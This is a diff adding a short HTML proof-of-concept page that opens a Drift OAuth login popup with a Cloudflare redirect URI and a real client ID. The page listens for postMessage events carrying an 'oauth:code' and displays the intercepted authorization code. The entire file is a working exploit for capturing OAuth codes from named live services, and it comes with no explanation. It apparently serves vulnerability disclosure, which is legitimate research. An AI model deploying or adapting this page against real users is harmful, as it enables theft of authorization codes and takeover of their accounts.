@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>test</title>
+</head>
+<body>
+<script type="text/javascript">w = window.open("https://start.drift.com/authorize/login?scope=&response_type=code&redirect_uri=https%3A%2F%2Fwww.cloudflare.com%2Fapps%2Foauth%2F&client_id=ss8ni4yyiexi8i");
+	window.addEventListener("message",function(e){if(e.data.type=="oauth:code"){alert(JSON.stringify(e.data));}})
+</script>
+</body>
+</html>
